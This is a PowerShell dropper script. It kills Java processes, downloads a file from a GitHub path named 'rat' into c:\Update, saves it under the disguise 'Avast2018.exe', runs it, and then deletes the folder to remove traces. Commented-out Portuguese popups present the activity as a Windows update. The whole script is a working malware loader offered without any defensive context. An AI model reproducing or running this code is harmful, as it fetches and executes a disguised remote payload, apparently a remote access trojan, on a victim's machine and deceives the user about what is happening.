
cd\

$f1 = 'c:\Update'

if ( Test-Path $f1 -PathType Container ) {
} else {
   md Update
}

cd c:\Update

$f1 = 'c:\Update\Update.exe'
if (Test-Path $f1) {
   try {	
      Remove-Item $f1 -recurse
   } Catch {
   }
}

$f3 = Get-Process Java -ErrorAction SilentlyContinue
if ($f3) { 
   Stop-Process -processname Java
}

$url = "https://github.com/itarare/rat/raw/master/Java.0000"
$output = "c:\Update\Avast2018.exe"
$start_time = Get-Date

Invoke-WebRequest -Uri $url -OutFile $output
Write-Output "[ $((Get-Date).Subtract($start_time).Seconds) ]"

$wshell=New-Object -comObject Wscript.Shell

if (Test-Path $output) {
   if (Test-Path $output) {
      Start-Process -FilePath $output

      $r2 = Get-Process Instalar -ErrorAction SilentlyContinue
      #if ($r2) { 
      #   $wshell.Popup("Windows atualizado.", 0, "Atenção !", 0x0)
      #} else {
      #   $wshell.Popup("Atualize o Windows 0x03.", 0, "Atenção !", 0x0)
      #}
   } else {
      #$wshell.Popup("Atualize o Windows 0x02.", 0, "Atenção !", 0x0)
   }
} else {
   #$wshell.Popup("Atualize o Windows 0x01.", 0, "Atenção !", 0)     
}

$f1 = 'c:\Update\Update.exe'
$f1 = 'c:\Update'

if (Test-Path $f1) {
   try {	
      Remove-Item $f1 -recurse
      $null = Remove-Item $f2 -Force
   } Catch {
   }
}
